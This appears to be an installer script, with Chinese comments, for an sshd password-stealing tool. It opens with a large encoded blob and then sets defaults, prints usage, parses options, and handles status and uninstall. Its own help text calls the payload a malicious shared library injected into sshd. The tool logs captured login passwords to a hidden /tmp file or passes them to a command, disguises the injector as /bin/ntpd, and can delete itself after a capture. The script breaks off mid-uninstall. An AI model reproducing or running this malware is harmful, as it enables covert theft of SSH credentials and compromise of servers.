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"

# ---------------- 默认配置 ----------------

state_file="/tmp/.sshdhooker.state"

evil_so_path="/tmp/.g.so"
inject_bin="/bin/ntpd"
payload="/tmp/.password.txt"
mode="0"
silent_mode="0"
silent_user="anyone"
libc_string=""
sshd_pid=""
keep_build=0
action="install"
injector_log="/tmp/.injector.log"

# ---------------- 基础函数 ----------------

info() { printf '[+] %s\n' "$*"; }
warn() { printf '[!] %s\n' "$*"; }
die()  { printf '[-] %s\n' "$*" >&2; exit 1; }

usage() {
    cat <<'USAGE'
用法: bash install.sh [选项]
  -e, --evil-so PATH    恶意 so 输出路径     (默认 /tmp/.g.so)
  -o, --output PATH     注入器伪装输出路径   (默认 /bin/ntpd)
  -m, --mode 0|1        0=写文件 1=命令执行  (默认 0)
  -p, --payload STR     密码输出文件 / 命令模板(命令模式需含两个 %s)
  -d, --delete USER     捕获后自删除 (anyone=任意用户登录成功即删)
  -l, --libc STR        /proc/pid/maps 匹配 libc 的特征串 (默认自动)
  -s, --sshd-pid PID    手动指定 sshd 主进程 pid (默认自动探测)
      --uninstall       停止注入器并清理所有文件
      --status          查看注入器运行状态
      --keep-build      保留编译临时目录 (调试用)
  -h, --help            本帮助
USAGE
}

# ---------------- 参数解析(短参 -x val 与长参 --long=val) ----------------

while [ $# -gt 0 ]; do
    case "$1" in
        -e|--evil-so)       [ $# -ge 2 ] || die "$1 缺少参数"; evil_so_path=$2; shift 2 ;;
        -e=*|--evil-so=*)   evil_so_path=${1#*=}; shift ;;
        -o|--output)        [ $# -ge 2 ] || die "$1 缺少参数"; inject_bin=$2; shift 2 ;;
        -o=*|--output=*)    inject_bin=${1#*=}; shift ;;
        -m|--mode)          [ $# -ge 2 ] || die "$1 缺少参数"; mode=$2; shift 2 ;;
        -m=*|--mode=*)      mode=${1#*=}; shift ;;
        -p|--payload)       [ $# -ge 2 ] || die "$1 缺少参数"; payload=$2; shift 2 ;;
        -p=*|--payload=*)   payload=${1#*=}; shift ;;
        -d|--delete)        [ $# -ge 2 ] || die "$1 缺少参数"; silent_mode=1; silent_user=$2; shift 2 ;;
        -d=*|--delete=*)    silent_mode=1; silent_user=${1#*=}; shift ;;
        -l|--libc)          [ $# -ge 2 ] || die "$1 缺少参数"; libc_string=$2; shift 2 ;;
        -l=*|--libc=*)      libc_string=${1#*=}; shift ;;
        -s|--sshd-pid)      [ $# -ge 2 ] || die "$1 缺少参数"; sshd_pid=$2; shift 2 ;;
        -s=*|--sshd-pid=*)  sshd_pid=${1#*=}; shift ;;
        --uninstall)        action=uninstall; shift ;;
        --status)           action=status; shift ;;
        --keep-build)       keep_build=1; shift ;;
        -h|--help)          usage; exit 0 ;;
        *)                  die "未知参数: $1 (见 --help)" ;;
    esac
done

# ---------------- --status / --uninstall ----------------

read_state() {
    [ -f "$state_file" ] || die "未找到安装记录 $state_file, 可能未安装过"
    state_inject_bin=$(grep '^inject_bin=' "$state_file" | cut -d= -f2-)
    state_evil_so=$(grep '^evil_so_path=' "$state_file" | cut -d= -f2-)
    state_pid=$(grep '^injector_pid=' "$state_file" | cut -d= -f2-)
    state_log=$(grep '^log=' "$state_file" | cut -d= -f2-)
    state_sshd=$(grep '^sshd_pid=' "$state_file" | cut -d= -f2-)
}

if [ "$action" = status ]; then
    read_state
    if [ -n "$state_pid" ] && kill -0 "$state_pid" 2>/dev/null; then
        info "注入器运行中: pid=$state_pid (sshd pid=$state_sshd)"
        info "二进制: $state_inject_bin ; 恶意 so: $state_evil_so"
    else
        warn "注入器未在运行 (记录 pid=$state_pid)"
    fi
    echo '--- 日志尾部:'
    tail -5 "$state_log" 2>/dev/null
    exit 0
fi

if [ "$action" = uninstall ]; then
    read_state
    if [ -n "$state_pid" ] && kill -0 "$state_pid" 2>/dev/null; then
        kill "$state_pid" 2>/dev/null
        sleep 1
        kill -0 "$state_pid" 2>/dev/null && kill -9 "$state_pid" 2>/dev/null
        info "注入器已停止 (pid=$state_pid)"
    else
        warn "注入器本就未在运行"
    fi
    rm -f "$state_inject_bin" "$state_evil_so" "$state_log" "$state_file"
    info "已清理: $state_inject_bin $state_evil_so $state_log $state_file"
